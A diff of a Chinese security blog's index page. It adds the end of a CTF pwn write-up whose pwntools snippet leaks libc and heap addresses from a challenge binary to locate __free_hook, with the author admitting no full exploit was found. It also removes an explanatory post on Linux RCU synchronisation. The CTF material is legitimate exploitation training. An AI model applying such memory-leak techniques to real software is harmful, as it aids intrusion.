+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">badshell: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">7b</span>723a1405c35735c73c5600c68ee2c53b2a1f33, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<ul>
+<li>64位，dynamically，全开</li>
+</ul>
+<p><strong>入侵思路</strong></p>
+<p>本题目没有做出来，比赛时没有时间做了，赛后复现找不到 wp 也很头痛</p>
+<p>cpp 的堆环境很乱，并且逆向出来也很难看，暂时没有找到漏洞点，但通过遗留在 unsorted chunk 中的 main_arena 指针，和遗留在 tcache chunk 中的 next 指针，可以完成泄露</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">touch(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">touch(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">mkdir(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;p&quot;</span>*<span class="number">0x780</span>)</span><br><span class="line">echo(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">cat(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ed063</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">echo(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x11</span>)</span><br><span class="line">cat(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x12a63</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
+<p>但程序只要执行过一次 <code>echo</code> 后（必须成功写入数据），再次执行 <code>touch</code> 和 <code>mkdir</code> 都会报错</p>
+<p>暂时只能完成泄露了，找不到漏洞点</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/13/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81CTF2022/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1717,194 +1852,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">Linux RCU机制</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-10-27 19:52:42" itemprop="dateCreated datePublished" datetime="2022-10-27T19:52:42+08:00">2022-10-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-11-02 15:13:52" itemprop="dateModified" datetime="2022-11-02T15:13:52+08:00">2022-11-02</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>4.3k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>4 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>RCU 简述</strong></p>
-<p>RCU(Read-Copy Update)，是 Linux 中比较重要的一种同步机制，特点如下：</p>
-<ul>
-<li>复制后更新：但更新数据的时候，需要先复制一份副本，在副本上完成修改，再一次性地替换旧数据”（替换数据时需要其他同步机制的保护）</li>
-<li>延迟回收内存：在数据被删除后（节点脱链）销毁前（释放空间），需要等待其他读线程停止使用该数据</li>
-</ul>
-<p>复制后更新是 Linux 内核实现的一种针对“读多写少”的共享数据的同步机制：</p>
-<ul>
-<li>不同于其他的同步机制，它允许多个读者同时访问共享数据，而且读者的性能不会受影响</li>
-<li>读者与写者之间也不需要同步机制，但需要“复制后再写”</li>
-<li>但如果存在多个写者时，写者与写者之间需要利用其他同步机制保证同步</li>
-</ul>
-<p>延迟回收内存是为了防止已经被销毁的数据被其他线程使用：</p>
-<ul>
-<li>一个位于临界区的指针被释放之后，另一个线程如果使用该指针就会产生安全问题</li>
-</ul>
-<p><strong>RCU 作用</strong></p>
-<p>RCU 的一个典型的应用场景是链表，主要解决以下问题：</p>
-<ul>
-<li>在读取过程中，另外一个线程删除了一个节点：<ul>
-<li>删除线程可以把这个节点从链表中移除，但它不能直接销毁这个节点，必须等到所有的读取线程读取完成以后，才进行销毁操作</li>
-<li>RCU 中把这个过程称为宽限期（Grace period）</li>
-</ul>
-</li>
-<li>在读取过程中，另外一个线程插入了一个新节点<ul>
-<li>需要保证读到的这个节点是完整的（得到的要么全是旧的数据，要么全是新的数据，反正不会是半新半旧的数据）</li>
-<li>这里涉及到了发布-订阅机制（Publish-Subscribe Mechanism）     </li>
-</ul>
-</li>
-<li>保证读取链表的完整性<ul>
-<li>新增或者删除一个节点，不至于导致其他正在遍历该链表的线程从中间断开</li>
-<li>但是 RCU 并不保证一定能读到新增的节点或者不读到要被删除的节点</li>
-</ul>
-</li>
-</ul>
-<p><strong>RCU API</strong></p>
-<p>添加链表项：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> list_next_rcu(list)	(*((struct list_head __rcu **)(&amp;(list)-&gt;next))) <span class="comment">/* 返回&amp;(list)-&gt;next),但不能直接访问它 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">		struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next)) <span class="comment">/* 检查一个节点是否可用 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span>-&gt;next = next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">	next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125; <span class="comment">/* 在prev和next中间插入new,但提供了RCU的保护 */</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>除了 <code>rcu_assign_pointer</code> 函数，其他地方和普通的 <code>__list_add</code> 没什么不同，该函数的底层应该是一个内存屏障（防止 CPU 优化执行顺序），以避免在新指针 new 准备好之前，就被引用了</li>
-</ul>
-<p>删除链表项：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del_rcu</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__list_del_entry(entry);</span><br><span class="line">	entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>和 <code>list_del</code> 相比，<code>list_del_rcu</code> 只对 <code>entry-&gt;prev</code> 进行了处理（目前不知道原因） </li>
-</ul>
-<p>更新链表：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_replace_rcu</span><span class="params">(struct list_head *old,</span></span></span><br><span class="line"><span class="params"><span class="function">				struct list_head *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">new</span>-&gt;next = old-&gt;next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = old-&gt;prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(<span class="keyword">new</span>-&gt;prev), <span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">new</span>-&gt;next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">	old-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>同样也是只对 <code>old-&gt;prev</code> 进行了处理</li>
-</ul>
-<p>访问链表：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rcu_read_lock(); <span class="comment">/* 声明了一个读端的临界区(read-side critical sections) */</span></span><br><span class="line">list_for_each_entry_rcu(pos, head, member) &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">rcu_read_unlock();</span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>rcu_read_lock</code> 和 <code>rcu_read_unlock</code> 用来标识 RCU read side 临界区（其作用就是帮助检测宽限期是否结束）</li>
-</ul>
-<p><strong>RCU 机制</strong></p>
-<p>宽限期：（Grace period）</p>
-<img src="/2022/10/27/Linux%20RCU%E6%9C%BA%E5%88%B6/1666865836143.png" class width="1666865836143"> 
-<ul>
-<li>宽限期的意义是，在一个删除动作发生后，它必须等待所有在宽限期开始前已经开始的 Reader 线程结束，才可以进行销毁操作（例如：Reader1，Reader2）</li>
-<li>删除之后，Reader 就会读取新数据，从而拿不到旧数据中的指针，因此就不用考虑安全问题</li>
-<li>用于判定宽限期开始的函数如下：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">synchronize_rcu</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	RCU_LOCKDEP_WARN(lock_is_held(&amp;rcu_bh_lock_map) ||</span><br><span class="line">			 lock_is_held(&amp;rcu_lock_map) ||</span><br><span class="line">			 lock_is_held(&amp;rcu_sched_lock_map),</span><br><span class="line">			 <span class="string">&quot;Illegal synchronize_rcu() in RCU read-side critical section&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(synchronize_rcu);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>检测宽限期是否结束的操作很复杂，需要利用 <code>rcu_read_lock</code> 和 <code>rcu_read_unlock</code> 所标记的区域进行判断</li>
-<li>宽限期是 RCU 实现中最复杂的部分，要求在提高读数据性能的同时，删除数据的性能也不能太差</li>
-</ul>
-<p>发布-订阅机制：（Publish-Subscribe Mechanism）    </p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">		struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next)) <span class="comment">/* 检查一个节点是否可用 */</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span>-&gt;next = next;</span><br><span class="line">	<span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">	rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">	next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125; <span class="comment">/* 在prev和next中间插入new,但提供了RCU的保护 */</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>发布-订阅机制其实就是 <code>rcu_assign_pointer</code> 函数的使用，用于解决优化导致的 CPU 执行顺序问题</li>
-<li>对应宏函数如下：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_assign_pointer(p, v)					      \</span></span><br><span class="line"><span class="meta">(&#123;									      \</span></span><br><span class="line"><span class="meta">	uintptr_t _r_a_p__v = (uintptr_t)(v);				      \</span></span><br><span class="line"><span class="meta">									      \</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">if</span> (__builtin_constant_p(v) &amp;&amp; (_r_a_p__v) == (uintptr_t)NULL)	      \</span></span><br><span class="line"><span class="meta">		WRITE_ONCE((p), (typeof(p))(_r_a_p__v));		      \</span></span><br><span class="line"><span class="meta">	<span class="meta-keyword">else</span>								      \</span></span><br><span class="line"><span class="meta">		smp_store_release(&amp;p, RCU_INITIALIZER((typeof(p))_r_a_p__v)); \</span></span><br><span class="line"><span class="meta">	_r_a_p__v;							      \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>其实我看不太懂这个函数，但它的功能和内存屏障很像，因此它的底层也极有可能是一个内存屏障</li>
-</ul>
-<p>复制更新机制：（Copy Update）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="comment">/* 将要被替换的对象 */</span></span><br><span class="line">q = kmalloc(<span class="keyword">sizeof</span>(*p), GFP_KERNEL);</span><br><span class="line">*q = *p;</span><br><span class="line">q-&gt;field = new_value;</span><br><span class="line">list_replace_rcu(&amp;p-&gt;<span class="built_in">list</span>, &amp;q-&gt;<span class="built_in">list</span>);</span><br><span class="line">synchronize_rcu();</span><br><span class="line">kfree(p);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>复制更新机制的实现基于宽限期（等待之前拿到旧节点的 Reader 执行结束，然后释放旧节点，之后拿到新节点的 Reader 不受影响）</li>
-<li><code>synchronize_rcu</code> 可以防止在 <code>list_replace_rcu</code> 之后，<code>kfree</code> 之前，有读线程使用了正在进行更新的链表节点</li>
-<li>更新以后的旧节点脱链，拿到旧节点的 Reader 在宽限期中执行完毕，之后的 <code>kfree</code> 就不会引发安全问题了</li>
-<li>PS：申请空间和复制数据的操作需要手动完成，没有专门的 API</li>
-</ul>
-<p><strong>RCU 案例</strong></p>
-<p>Reader 正在遍历查找链表节点：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">long</span> key, <span class="keyword">int</span> *result)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">lp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">el</span> *<span class="title">p</span>;</span></span><br><span class="line">    </span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    list_for_each_entry_rcu(p, head, lp) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;key == key) &#123;</span><br><span class="line">            *result = p-&gt;data;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Writer 正在遍历删除链表节点：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">(<span class="keyword">long</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">lp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">el</span> *<span class="title">p</span>;</span></span><br><span class="line">    </span><br><span class="line">    spin_lock(&amp;listmutex);</span><br><span class="line">    list_for_each_entry_rcu(p, head, lp) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;key == key) &#123;</span><br><span class="line">            list_del_rcu(&amp;p-&gt;<span class="built_in">list</span>);</span><br><span class="line">            synchronize_rcu(); </span><br><span class="line">            spin_unlock(&amp;listmutex);</span><br><span class="line">            kfree(p);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock(&amp;listmutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>假设一个线程执行 Reader，另一个线程执行 Writer：</p>
-<ul>
-<li>如果使用读写锁，那么 Reader 和 Writer 就不能同时进行，影响效率</li>
-<li>如果使用顺序锁，那么在 Reader 和 Writer 同时操作指针时容易出现问题</li>
-<li>这里使用了 RCU 锁，Writer 会在 <code>synchronize_rcu</code> 上等待持有旧指针的 Reader 执行完毕，只是牺牲了 Writer 的效率就避免了安全问题</li>
-</ul>
-<p>参考：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113999842">rcu 机制简介 - 知乎</a> </li>
-<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1006204">深入理解 Linux 的 RCU 机制 - 腾讯云开发者社区</a> </li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1976,7 +1923,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">276</span>
+          <span class="site-state-item-count">277</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2025,12 +1972,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">3.8m</span>
+    <span title="Symbols count total">3.9m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">58:13</span>
+    <span title="Reading time total">58:25</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
